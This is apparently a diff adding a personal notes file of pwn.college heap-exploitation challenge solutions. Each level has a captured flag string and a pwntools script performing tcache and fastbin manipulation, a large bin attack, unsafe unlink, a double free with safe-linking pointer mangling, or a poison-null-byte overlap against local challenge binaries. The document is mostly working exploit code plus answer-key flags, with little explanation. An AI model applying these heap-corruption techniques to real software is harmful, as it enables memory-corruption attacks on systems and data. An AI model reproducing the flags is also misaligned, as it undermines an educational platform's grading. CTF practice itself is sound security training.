@@ -1,0 +1,300 @@
+1.0. pwn.college{Eu8LaSqrKnerbzm9OOiN7xetAdT.0VOyUzMsITNxUzW}
+def fill_tcache(p):
+    for i in range(8):
+        p.sendline(f'malloc {i} 1024'.encode())
+    for i in range(8):
+        p.sendline(f'free {i}'.encode())
+def challenge1():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    fill_tcache(p)
+    p.sendline(b"read_flag puts 7")
+    info(p.clean())
+    p.kill()
+
+1.1. pwn.college{0KcSiOJdJBI5Je4jdxeO8rlIRvJ.0FMzUzMsITNxUzW}
+no changes...
+
+
+
+2.0. pwn.college{UXIjI49ORFkZh55IPGg8AVCTtZd.0VMzUzMsITNxUzW}
+def challenge2():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    # first 7 allocs go to the tcache
+    # last 11 allocs go to the fastbin 0x80
+    for i in range(16):
+        p.sendline(f'malloc {i} 120'.encode())
+    for i in range(16):
+        p.sendline(f'free {i}'.encode())
+    # first 7 allocs go to the tcache
+    # last 11 allocs go to the fastbins 0x70
+    for i in range(16):
+        p.sendline(f'malloc {i} 100'.encode())
+    for i in range(16):
+        p.sendline(f'free {i}'.encode())
+    # all 16 allocs go to the fastbins 0x70
+    for i in range(16):
+        p.sendline(f'malloc {i} 95'.encode())
+    for i in range(16):
+        p.sendline(f'free {i}'.encode())
+    # 0x70 fastbin will have 27 allocs (112 * 27 = 3024)
+    p.sendline(b'read_flag puts 15')
+    info(p.clean())
+    p.kill()
+
+
+2.1. pwn.college{QxlHuhP5jD45AmIMtp5AUARSmIB.0lMzUzMsITNxUzW}
+def challenge2():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    # fill up the 0x80 tcache and add 9 entries to the 0x80 fastbins
+    for i in range(16):
+        p.sendline(f'malloc {i} 120'.encode())
+        p.clean()
+    for i in range(16):
+        p.sendline(f'free {i}'.encode())
+    for i in range(16):
+        p.sendline(f'malloc {i} 100'.encode())
+        p.clean()
+    # fill up the tcache for 0x70 with the values from the bottom of the heap
+    # then fill up the fastbins with the ones in the middle of the heap 
+    # this is so that there is 0x600 bytes of fastbins space to consolidate for
+    # the first time the flag is allocated
+    for i in range(14, -1, -1):
+        p.sendline(f'free {i}'.encode())
+    # free the last entry in the heap and it should go to the fastbins
+    # allocate the flag, the first time should go to the middle of the heap
+    # the second time should go to the end of the heap at alloc 15
+    p.sendline(f'free 15 read_flag puts 15')
+    info(p.clean())
+    p.kill()
+
+3.0. pwn.college{Y9-cq2mxXMuv_PqhuGC-BV9bL2Y.01MzUzMsITNxUzW}
+def challenge3():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    # malloc a large chunk so that the final read of the flag is the second alloc
+    p.sendline(b'malloc 0 2100 malloc 1 2000 free 0 free 1 read_flag puts 1')
+    info(p.clean())
+    p.interactive()
+    p.kill()
+
+
+3.1. pwn.college{UjjKg1-u572GoPETkVnhkLVhdpt.0FNzUzMsITNxUzW}
+changes...
+    p.sendline(b'malloc 0 9740 malloc 1 2000 free 0 free 1 read_flag puts 1')
+
+
+4.0. pwn.college{0pzw4xTugIz6B_-kmpiUJzXLeis.0VNzUzMsITNxUzW}
+def challenge4():
+    authenticated = 0x4041C0
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    # set up the heap from large_bin_attack.c
+    p.sendline(
+    '''malloc 0 5032 malloc 1 3000 
+    malloc 2 5000 malloc 3 3000 
+    free 0
+    malloc 4 6000
+    free 2
+    '''.encode())
+    info(p.clean())
+    # leak the fd pointer of alloc 0
+    p.sendline(b'puts 0')
+    p.readuntil(b'Data: ')
+    leak = int.from_bytes(p.readline().strip(), 'little')
+    print(hex(leak))
+    # create fake heap metadata
+    # set the fd_size and bk_size ptrs to be 0x20 before authenticated
+    p.sendline(b'safe_read 0')
+    p.send(p64(leak)*2 + p64(authenticated-0x20)*2)
+    # when you malloc here the metadata of alloc[2] will be updated
+    # this will cause a value to be written to authenticated so you can send_flag
+    p.sendline(b'malloc 5 6000 send_flag')
+    info(p.clean())
+    p.kill()
+
+4.1. pwn.college{0gxjLr6fbXN3_tVRSdvCj0uZXHF.0lNzUzMsITNxUzW}
+no changes...
+
+5.0. pwn.college{kawUiGIb5gxsfiVoPQC4jjvCI3L.01NzUzMsITNxUzW}
+def challenge5():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    input(f'PID {p.pid}')
+    p.readuntil(b'Reading the flag into ')
+    flag = int(p.readline().strip().decode()[:-1], 16)
+    print(f'FLAG AT: {hex(flag)}')
+    chunk0 = 0x404140
+    chunk1 = flag + 2192
+    print(f'CHUNK0 AT: {hex(chunk0)}')
+    print(f'CHUNK1 AT: {hex(chunk1)}')
+
+    p.sendline(b'malloc 0 1056 malloc 1 1056 read 0 3000')
+    payload = p64(0x00) + p64(0x431-0x10) + p64(chunk0-24) + p64(chunk0-16) + p64(0x00)*128 + p64(0x420) + p64(0x430)
+    p.send(payload)
+    p.sendline(b'free 1 read 0 1056')
+    p.send(p64(0x00) + p64(0x00) + p64(0x404128) + p64(flag))
+    p.sendline(b'puts 0')
+    info(p.clean())
+    p.kill()
+
+5.1. pwn.college{U1O3X6aQKXA5xJjyo1IDAFm_AOO.0FOzUzMsITNxUzW}
+no changes...
+
+
+6.0. pwn.college{wLlut8Pk4850f1PZDrBfraw_khm.0VOzUzMsITNxUzW}
+def challenge6():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    # get the address of the flag
+    p.readuntil(b'flag into ')
+    flag = int(p.readline().strip().decode()[:-1], 16) - 0x28
+    # get a heap leak
+    p.sendline(f'calloc 0 24 free 0 puts 0')
+    p.readuntil(b'Data: ')
+    leak = int.from_bytes(p.readlineb().strip(), 'little')
+    # fill tcache
+    for i in range(7):
+        p.sendline(f'calloc {i} 24')
+    for i in range(7):
+        p.sendline(f'free {i}')
+    # alloc 3 buffers
+    p.sendline(b'calloc 7 24 calloc 8 24 calloc 9 24')
+    # free the first one then the second one then the first one again
+    p.sendline(b'free 7 free 8 free 7')
+    # alloc 2 more times (d = 10)
+    p.sendline(b'calloc 10 24 calloc 11 24')
+    # read 0x20 right before the flag
+    p.sendline(b'read_to_global 800')
+    p.send(p64(0x20)*96 + p64(0x20))
+    # read the location of the flag into the fastbins
+    d = (leak) ^ flag
+    p.sendline(b'safer_read 6')
+    p.send(p64(d))
+    # calloc the location of the flag into alloc[13]
+    p.sendline(b'calloc 12 24 calloc 13 24') 
+    # read 24 'a's so we can print the flag
+    p.sendline(b'safer_read 13')
+    p.send(b'a'*24)
+    p.sendline(b'puts 13')
+    info(p.clean())
+    input(f'PID {p.pid}')
+    p.interactive()
+    p.kill()
+
+6.1. pwn.college{YFTR73LFWQuHtBBq6NCJoznvT9h.0FM0UzMsITNxUzW}
+changes...
+    p.send(p64(0x20)*88 + p64(0x20))
+
+
+7.0. pwn.college{MIxATk83Ygva9Ymo4FwQmm8bs72.0VM0UzMsITNxUzW}
+def challenge7():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    # get the address of the flag
+    p.readuntil(b'flag into ')
+    flag = int(p.readline().strip().decode()[:-1], 16) - 0x38
+    # get a heap leak
+    p.sendline(f'calloc 0 32 free 0 puts 0')
+    p.readuntil(b'Data: ')
+    leak = int.from_bytes(p.readlineb().strip(), 'little')
+    # fill tcache
+    for i in range(7):
+        p.sendline(f'calloc {i} 32')
+    for i in range(7):
+        p.sendline(f'free {i}')
+    # alloc 3 buffers
+    p.sendline(b'calloc 7 32 calloc 8 32 calloc 9 32')
+    # free the first one then the second one then the first one again
+    p.sendline(b'free 7 free 8 free 7')
+    # alloc 2 more times (d = 6)
+    p.sendline(b'calloc 10 32 calloc 11 32')
+    # read the location of the flag into the fastbins
+    d = (leak) ^ flag
+    p.sendline(b'safer_read 6')
+    p.send(p64(d))
+    # calloc the location of the flag into alloc[13]
+    # and set the size to be 0x30 (48) using alloc[6] and alloc[7]
+    p.sendline(b'calloc 6 48 calloc 14 32 calloc 7 0 calloc 13 32')
+    # read 24 'a's to overwrite the size of alloc 13
+    # read 40 'a's to print the flag
+    p.sendline(b'safer_read 13')
+    p.send(b'a'*24)
+    p.sendline(b'safer_read 13')
+    p.send(b'a'*40)
+    p.sendline(b'puts 13')
+    print(f'flag {hex(flag)}')
+    input(f'PID {p.pid}')
+    info(p.clean())
+    p.kill()
+
+7.1. pwn.college{YXMJSaL7DV5P17HPspZjyv26cTn.0lM0UzMsITNxUzW}
+no changes...
+
+8.0. pwn.college{QXsMmqHKtciSA05ebjFDS5gnX7N.01M0UzMsITNxUzW}
+def challenge8():
+    p = process([CHALLENGE_NAME], close_fds=False)
+    # get heap leak
+    p.sendline(b'malloc 0 16 malloc 1 16 free 0 free 1 malloc 0 16')
+    info(p.clean()) 
+    p.sendline(b'puts 0')
+    p.readuntil(b'Data: ')
+    heap_leak = demangle(int.from_bytes(p.readlineb().strip(), 'little'))  
+    # a
+    p.sendline(b'malloc 0 56')  
+    a0 = 0 # prev_size (Not Used)
+    a1 = 0x60 # size 
+    a2 = heap_leak + 64 # fwd
+    a3 = heap_leak + 64 # bck
+    p.sendline(b'read_copy 0')
+    p.send(p64(a0) + p64(a1) + p64(a2) + p64(a3))
+    # b
+    p.sendline(b'malloc 1 40')
+    read_b_size = 0x28
+    # c
+    p.sendline(b'malloc 2 248')
+    c_size_ptr = 0x101
+    # We overflow 'b' with a single null byte into the metadata of 'c'
+    p.sendline(b'read_copy 1')
+    p.send(b'\x00'*40)
+    # 
+    fake_size = 0x60
+    p.sendline(b'read_copy 1')
+    p.send(b'\x00'*32 + b'\x60')
+    # fill tcache
+    for i in range(7):
+        p.sendline(f'malloc {i+3} 248'.encode())
+
+    for i in range(7):
+        p.sendline(f'free {i+3}'.encode())
+    # free c
+    p.sendline(b'free 2')
+    # d
+    p.sendline(b'malloc 10 344')
+    # malloc and free 'pad'
+    p.sendline(b'malloc 11 40 free 11')
+    # free b
+    p.sendline(b'free 1')
+    # We overwrite b's fwd pointer using chunk 'd'
+    target = heap_leak + 2272
+    d = target ^ (heap_leak >> 12)
+    p.sendline(b'read_copy 10')
+    p.send(p64(heap_leak >> 12) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x31) + p64(d))
+    # now the exploit is set up
+    p.sendline(b'malloc 12 40 malloc 12 40')
+    # 12 points to the flag
+    p.sendline(b'read_flag puts 12') 
+    info(p.clean())
+    input(f'PID {p.pid}')
+    print(f'heap leak {hex(heap_leak)}')
+    p.interactive()
+    p.kill()
+
+8.1. pwn.college{UhKvCl5yYiksqlZK0y6phMAlGjH.0FN0UzMsITNxUzW}
+no changes...
+
+
+
+
+
+
+
